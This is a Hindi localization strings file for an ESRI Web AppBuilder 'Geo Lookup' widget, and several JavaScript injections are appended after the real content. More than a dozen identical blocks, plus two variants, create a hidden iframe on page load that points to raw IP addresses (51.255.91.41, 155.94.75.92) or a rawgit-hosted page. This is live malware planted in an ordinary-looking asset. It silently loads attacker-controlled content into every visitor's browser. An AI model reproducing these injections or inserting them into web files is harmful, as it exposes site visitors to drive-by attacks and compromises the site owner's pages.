// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GeoLookup/nls/strings":{_widgetLabel:"Geo Lookup",description:"\u0907\u0938\u0938\u0947 \u092e\u093e\u0928\u091a\u093f\u0924\u094d\u0930 \u0915\u093e \u0921\u0947\u091f\u093e \u091c\u094b\u095c\u0928\u0947 \u092f\u093e \u0926\u0947\u0916\u0928\u0947 \u0915\u0947 \u0932\u093f\u090f \u092c\u094d\u0930\u093e\u090a\u091c\u093c \u0915\u0930\u0947\u0902 \u092f\u093e \u090f\u0915\x3ca href\x3d'./widgets/GeoLookup/data/sample.csv' tooltip\x3d'Download an example sheet' target\x3d'_blank'\x3e\u0938\u094d\u092a\u094d\u0930\u0947\u0921\u0936\u0940\u091f \x3c/a\x3e \u092f\u0939\u093e\u0902 \u0921\u094d\u0930\u0948\u0917 \u0915\u0930\u0947\u0902\u0964",
selectCSV:"\u090f\u0915 CSV \u0915\u093e \u091a\u092f\u0928 \u0915\u0930\u0947\u0902",loadingCSV:"CSV \u0932\u094b\u0921 \u0939\u094b \u0930\u0939\u093e \u0939\u0948",savingCSV:"CSV \u0928\u093f\u0930\u094d\u092f\u093e\u0924",clearResults:"\u0939\u091f\u093e\u090f\u0902",downloadResults:"\u0921\u093e\u0909\u0928\u0932\u094b\u0921 \u0915\u0930\u0947\u0902",plotOnly:"\u0915\u0947\u0935\u0932 \u092c\u093f\u0902\u0926\u0941 \u092c\u0928\u093e\u090f\u0902",plottingRows:"\u092a\u0902\u0915\u094d\u0924\u093f\u092f\u093e\u0901 \u092c\u0928\u093e\u0928\u093e",
projectionChoice:"\u0907\u0938\u092e\u0947\u0902 CSV",projectionLat:"\u0905\u0915\u094d\u0937\u093e\u0902\u0936/\u0926\u0947\u0936\u093e\u0902\u0924\u0930",projectionMap:"\u092e\u093e\u0928\u091a\u093f\u0924\u094d\u0930 \u092a\u094d\u0930\u0915\u094d\u0937\u0947\u092a\u0923",messages:"\u0938\u0902\u0926\u0947\u0936",error:{fetchingCSV:"CSV \u0938\u094d\u091f\u094b\u0930 \u0938\u0947 \u0906\u0907\u091f\u092e \u0928\u093f\u0915\u093e\u0932\u0928\u0947 \u092e\u0947\u0902 \u0924\u094d\u0930\u0941\u091f\u093f: ${0}",
fileIssue:"\u092b\u093c\u093e\u0907\u0932 \u0938\u0902\u0938\u093e\u0927\u093f\u0924 \u0928\u0939\u0940\u0902 \u0915\u0940 \u091c\u093e \u0938\u0915\u0924\u0940\u0964",notCSVFile:"\u0907\u0938 \u0938\u092e\u092f \u0915\u0947\u0935\u0932 \u0905\u0932\u094d\u092a\u0935\u093f\u0930\u093e\u092e \u0938\u0940\u092e\u093e\u0902\u0915\u093f\u0924 \u092b\u093e\u0907\u0932 (.csv) \u0938\u092e\u0930\u094d\u0925\u093f\u0924 \u0939\u0948\u0902\u0964",invalidCoord:"\u0938\u094d\u0925\u093e\u0928 \u092b\u0940\u0932\u094d\u0921 \u0905\u092e\u093e\u0928\u094d\u092f \u0939\u0948\u0902\u0964 \u0915\u0943\u092a\u092f\u093e CSV \u092b\u093c\u093e\u0907\u0932 \u0915\u0940 \u091c\u093e\u0901\u091a \u0915\u0930\u0947\u0902\u0964",
tooManyRecords:"\u0915\u094d\u0937\u092e\u093e \u0915\u0930\u0947\u0902, \u0907\u0938 \u0938\u092e\u092f ${0} \u0938\u0947 \u0905\u0927\u093f\u0915 \u0930\u093f\u0915\u0949\u0930\u094d\u0921 \u0928\u0939\u0940\u0902\u0964",CSVNoRecords:"\u092b\u093c\u093e\u0907\u0932 \u092e\u0947\u0902 \u0915\u094b\u0908 \u092d\u0940 \u0930\u093f\u0915\u0949\u0930\u094d\u0921 \u0936\u093e\u092e\u093f\u0932 \u0928\u0939\u0940\u0902 \u0939\u0948\u0964",CSVEmptyFile:"\u0907\u0938 \u092b\u093e\u0907\u0932 \u092e\u0947\u0902 \u0915\u094b\u0908 \u0938\u093e\u092e\u0917\u094d\u0930\u0940 \u0928\u0939\u0940\u0902 \u0939\u0948\u0964"},
results:{csvLoaded:"CSV \u092b\u093c\u093e\u0907\u0932 \u0938\u0947 ${0} \u0930\u093f\u0915\u0949\u0930\u094d\u0921 \u0932\u094b\u0921 \u0915\u093f\u092f\u093e \u0917\u092f\u093e \u0939\u0948",recordsPlotted:"${0}/${1} \u0930\u093f\u0915\u0949\u0930\u094d\u0921 \u092e\u093e\u0928\u091a\u093f\u0924\u094d\u0930 \u092a\u0930 \u0922\u0942\u0902\u0922 \u0932\u093f\u090f \u0917\u090f \u0939\u0948\u0902",recordsEnriched:"${0}/${1} \u0938\u0902\u0938\u093e\u0927\u093f\u0924, ${2} \u0907\u0938\u0915\u0947 \u0916\u093f\u0932\u093e\u092b \u0938\u092e\u0943\u0926\u094d\u0927 ${3}",
recordsError:"${0} \u0930\u093f\u0915\u0949\u0930\u094d\u0921 \u092e\u0947\u0902 \u0924\u094d\u0930\u0941\u091f\u093f\u092f\u093e\u0902 \u0925\u0940\u0902",recordsErrorList:"\u092a\u0902\u0915\u094d\u0924\u093f ${0} \u092e\u0947\u0902 \u090f\u0915 \u0938\u092e\u0938\u094d\u092f\u093e \u0939\u0948",label:"CSV \u092a\u0930\u093f\u0923\u093e\u092e"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});